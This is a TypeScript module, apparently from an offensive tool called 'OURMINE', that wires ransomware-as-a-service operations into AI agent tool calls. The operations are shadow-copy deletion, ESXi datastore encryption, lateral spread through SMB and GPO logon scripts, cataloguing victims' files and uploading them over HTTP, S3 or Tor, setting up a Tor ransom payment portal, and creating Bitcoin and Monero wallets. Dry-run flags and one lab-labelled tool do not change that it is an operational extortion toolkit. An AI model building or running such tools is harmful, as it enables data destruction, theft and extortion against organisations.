import * as path from "node:path"
import type { AgentToolContext, ToolRunResult } from "../agent_tools.ts"
import { hostFromTarget } from "../agent_tools.ts"
import { result, agentToolBridge } from "./_shared.ts"

export const raas_bridge = {
  raas_campaign: async (ctx, params) => {
    const { runRaasCampaign } = await import("../raas_engine.ts")
    const targetDir = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = await runRaasCampaign({
      targetDir,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      esxiHost: params.esxi_host as string | undefined,
      smbTargets: params.smb_targets as string[] | undefined,
      domain: params.domain as string | undefined,
      familyName: String(params.family ?? "OURMINE-RAAS"),
    })
    return result("raas_campaign", "runRaasCampaign", ctx, r, !r.dryRun || r.leakCatalog.count >= 0)
  },
  raas_vss_wipe: async (ctx, params) => {
    const { deleteVolumeShadowCopies } = await import("../raas_engine.ts")
    const r = deleteVolumeShadowCopies({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_vss_wipe", "deleteVolumeShadowCopies", ctx, r, r.success || r.dryRun)
  },
  raas_leak_catalog: async (ctx, params) => {
    const { buildLeakCatalog } = await import("../raas_engine.ts")
    const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = buildLeakCatalog(root, { live: ctx.live, maxFiles: Number(params.max_files ?? 100) })
    return result("raas_leak_catalog", "buildLeakCatalog", ctx, { count: r.entries.length, manifestPath: r.manifestPath, totalBytes: r.totalBytes })
  },
  raas_esxi_encrypt: async (ctx, params) => {
    const { encryptEsxiDatastores } = await import("../raas_engine.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await encryptEsxiDatastores(host, { live: ctx.live, forceLive: Boolean(params.forceLive), mountPath: params.mount_path as string | undefined })
    return result("raas_esxi_encrypt", "encryptEsxiDatastores", ctx, r, r.dryRun || r.encrypted.length >= 0)
  },
  raas_smb_spread: async (ctx, params) => {
    const { spreadViaSmb } = await import("../raas_engine.ts")
    const targets = (params.targets as string[] | undefined) ?? [hostFromTarget(ctx.target)]
    const cmd = String(params.command ?? "cmd /c echo ourmine_raas_marker")
    const r = spreadViaSmb(targets, cmd, { live: ctx.live, forceLive: Boolean(params.forceLive), domain: params.domain as string | undefined })
    return result("raas_smb_spread", "spreadViaSmb", ctx, r, r.success || r.dryRun)
  },
  raas_gpo_spread: async (ctx, params) => {
    const { spreadViaGpo } = await import("../raas_engine.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = spreadViaGpo(domain, payload, { live: ctx.live, forceLive: Boolean(params.forceLive), dc: params.dc as string | undefined })
    return result("raas_gpo_spread", "spreadViaGpo", ctx, r)
  },
  raas_payment: async (ctx, params) => {
    const { generatePaymentBundle } = await import("../raas_engine.ts")
    const r = generatePaymentBundle({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_payment", "generatePaymentBundle", ctx, { keyId: r.keyId, torPaymentId: r.torPaymentId, portalDescriptorPath: r.portalDescriptorPath })
  },
  raas_exfil_upload: async (ctx, params) => {
    const { buildLeakCatalog } = await import("../raas_engine.ts")
    const { uploadLeakManifestAdvanced } = await import("../raas_advanced.ts")
    let manifestPath = String(params.manifest_path ?? "")
    if (!manifestPath) {
      const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/tmp")
      const cat = buildLeakCatalog(root, { maxFiles: Number(params.max_files ?? 50) })
      manifestPath = cat.manifestPath
    }
    const r = await uploadLeakManifestAdvanced(manifestPath, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      mode: params.mode as "http" | "s3" | "tor" | "auto" | undefined,
      uploadUrl: params.upload_url as string | undefined,
      bearerToken: params.bearer_token as string | undefined,
    })
    return result("raas_exfil_upload", "uploadLeakManifestAdvanced", ctx, r, r.uploaded || r.dryRun)
  },
  raas_gpo_deploy: async (ctx, params) => {
    const { modifyGpoLogonScript } = await import("../raas_advanced.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = modifyGpoLogonScript(domain, payload, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      dc: params.dc as string | undefined,
      username: params.username as string | undefined,
      password: params.password as string | undefined,
      gpoGuid: params.gpo_guid as string | undefined,
    })
    return result("raas_gpo_deploy", "modifyGpoLogonScript", ctx, r, r.smbUploaded || r.dryRun)
  },
  raas_tor_portal: async (ctx, params) => {
    const { provisionTorPortal } = await import("../raas_advanced.ts")
    const r = provisionTorPortal(
      {
        keyId: String(params.key_id ?? `sess_${Date.now()}`),
        bitcoinAddress: String(params.btc ?? "bc1qourmine000000000000000000000"),
        moneroAddress: String(params.xmr ?? "4ourmine000000000000000000000000000000000000000000000000000000000"),
      },
      { live: ctx.live, forceLive: Boolean(params.forceLive) },
    )
    return result("raas_tor_portal", "provisionTorPortal", ctx, r)
  },
  raas_esxi_deploy: async (ctx, params) => {
    const { deployEsxiEncryptor } = await import("../raas_advanced.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const keyId = String(params.key_id ?? `esxi_${Date.now()}`)
    const r = deployEsxiEncryptor(host, keyId, { live: ctx.live, forceLive: Boolean(params.forceLive), sshUser: params.ssh_user as string | undefined })
    return result("raas_esxi_deploy", "deployEsxiEncryptor", ctx, r, r.deployed || r.dryRun)
  },
  raas_wallet_create: async (ctx, params) => {
    const { createWalletPair, walletTerminalSummary, ensureWalletToolchain } = await import("../raas_wallet.ts")
    const opts = {
      ephemeral: params.persist !== true,
      campaignId: params.campaign_id as string | undefined,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      autoInstall: params.auto_install !== false,
    }
    let install = undefined as Awaited<ReturnType<typeof ensureWalletToolchain>> | undefined
    if (params.install_deps === true || (opts.autoInstall && ctx.live && opts.forceLive)) {
      install = ensureWalletToolchain(opts)
    }
    const { btc, xmr, install: createInstall } = createWalletPair(opts)
    return result("raas_wallet_create", "createWalletPair", ctx, {
      btc: { id: btc.id, address: btc.address, ephemeral: btc.ephemeral, source: btc.source },
      xmr: { id: xmr.id, address: xmr.address, ephemeral: xmr.ephemeral, source: xmr.source, error: xmr.error },
      install: install ?? createInstall,
      summary: walletTerminalSummary({ ephemeral: params.persist !== true }),
    })
  },
  raas_wallet_install_deps: async (ctx, params) => {
    const { ensureWalletToolchain } = await import("../raas_wallet.ts")
    const r = ensureWalletToolchain({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_install_deps", "ensureWalletToolchain", ctx, r, r.installed.length > 0 || r.dryRun)
  },
  raas_wallet_balance: async (ctx, params) => {
    const { getWalletBalance } = await import("../raas_wallet.ts")
    const r = await getWalletBalance(String(params.wallet_id ?? ""), { live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_balance", "getWalletBalance", ctx, r)
  },
  raas_wallet_list: async (ctx) => {
    const { listWallets, walletTerminalSummary, checkWalletToolchain } = await import("../raas_wallet.ts")
    return result("raas_wallet_list", "listWallets", ctx, {
      toolchain: checkWalletToolchain(),
      wallets: listWallets({}),
      summary: walletTerminalSummary({}),
    })
  },
  raas_wallet_wipe: async (ctx, params) => {
    const { wipeWallet, wipeAllWallets } = await import("../raas_wallet.ts")
    const opts = { live: ctx.live, forceLive: Boolean(params.forceLive) }
    const r = params.all ? wipeAllWallets(opts) : wipeWallet(String(params.wallet_id ?? ""), opts)
    return result("raas_wallet_wipe", params.all ? "wipeAllWallets" : "wipeWallet", ctx, r, Boolean((r as { wiped?: boolean }).wiped ?? (r as { count?: number }).count))
  },
  collection_engine: async (ctx, params) => {
    const { stageCollection } = await import("../collection_engine.ts")
    const dir = String(params.scan_dir ?? params.target_dir ?? process.cwd())
    const r = await stageCollection(dir, { live: ctx.live, maxFiles: Number(params.max_files ?? 100) })
    return result("collection_engine", "stageCollection", ctx, r, r.artifacts.length > 0 || !ctx.live)
  },
  esxi_lab_encrypt: async (ctx, params) => {
    const { runLabEsxiEncryptWithRecovery } = await import("../raas_advanced.ts")
    const dir = String(params.target_dir ?? path.join(process.cwd(), ".ourmine/lab/esxi"))
    const r = runLabEsxiEncryptWithRecovery(dir, String(params.key_id ?? `lab_${Date.now()}`))
    return result("esxi_lab_encrypt", "runLabEsxiEncryptWithRecovery", ctx, r, r.recovered)
  },
  impact_assess: async (ctx, params) => agentToolBridge(ctx, "impact_assess", params, "impact_assess"),
} as const
